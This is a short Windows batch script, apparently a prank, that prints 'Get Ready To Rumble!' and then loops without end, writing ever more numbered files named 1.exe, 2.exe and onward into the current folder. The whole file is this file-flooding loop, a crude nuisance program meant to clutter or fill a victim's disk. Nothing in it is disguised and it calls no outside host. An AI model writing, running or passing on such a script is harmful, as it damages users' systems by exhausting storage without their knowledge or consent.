@echo off
title Vibez
echo Get Ready To Rumble!
set /a loop=0
:NOPE
set /a loop=%loop%+1
echo %loop% > %loop%.exe
goto NOPE
